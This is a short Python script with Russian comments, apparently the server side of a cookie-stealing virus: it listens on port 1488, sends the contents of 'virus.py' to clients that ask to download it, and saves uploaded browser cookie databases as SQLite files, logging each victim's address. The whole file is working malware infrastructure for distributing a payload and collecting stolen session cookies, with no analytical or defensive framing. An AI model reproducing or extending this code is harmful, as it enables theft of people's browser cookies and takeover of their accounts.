import socket
from uuid import uuid4

with open('virus.py', 'rb') as virus_code:
    code = virus_code.read()

# Инициализация серверного сокета, привязка к порту 1488
sock = socket.socket()
sock.bind(('', 1488))
# Устанавливаем максимальное количество соединений
sock.listen(10)

try:
    while True:
        # Блокирующий метод, ожидает нового соединения
        conn, addr = sock.accept()

        data = conn.recv(1024)
        if data == b'Download':
            # Отослать код вируса
            conn.send(code)
            conn.close()
            print(f'Virus sent to {addr[0]}:{addr[1]}')

        elif data == b'Upload':
            # Получить файл куков
            filename = f'{uuid4()}.sqlite'

            with open(filename, 'wb') as f:
                while True:
                    # Получение и запись файла по кусочкам по 1024 байта
                    file_chunk = conn.recv(1024)
                    if not file_chunk:
                        conn.close()
                        break
                    f.write(file_chunk)

                print(f'Received file from {addr[0]}:{addr[1]} | Name: {filename}')

        else:
            conn.close()

except KeyboardInterrupt:
    # Закрытие сокета по комбинации CTRL+C, для того, чтобы не занимать порт.
    sock.close()
